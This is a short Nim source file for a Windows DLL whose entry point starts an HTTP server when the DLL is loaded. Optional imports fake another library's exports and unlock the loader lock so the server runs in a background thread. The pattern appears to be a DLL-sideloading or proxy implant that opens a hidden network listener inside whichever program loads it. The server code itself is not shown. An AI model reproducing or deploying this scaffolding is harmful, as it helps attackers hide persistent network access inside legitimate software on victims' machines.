import winim
import httpserv
when defined(fakeexports):
  import fakeexports

proc NimMain() {.cdecl, importc.}

proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
  if fdwReason != DLL_PROCESS_ATTACH: return true

  NimMain()

  when defined(unlockloader):
    import lockpick
    unlockLoaderLock()
    spawn runHttpServ()
    lockLoaderLock()
  else:
    runHttpServ()

  return true
